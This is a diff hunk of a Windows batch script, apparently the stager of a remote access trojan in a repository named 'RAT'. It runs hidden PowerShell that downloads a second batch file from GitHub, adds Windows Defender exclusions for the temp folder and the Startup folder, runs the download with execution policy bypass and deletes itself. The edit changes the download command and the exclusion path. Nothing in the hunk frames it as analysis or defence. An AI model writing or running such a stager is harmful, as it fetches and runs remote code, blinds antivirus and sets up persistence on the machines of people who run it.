@@ -27,6 +27,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-powershell powershell.exe -windowstyle hidden "wget https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat"; Add-MpPreference -ExclusionPath "C:/Users/%username%/"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -OutFile secondary.bat"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
 powershell powershell.exe -windowstyle hidden -ep bypass ./secondary.bat
 del Starter.bat
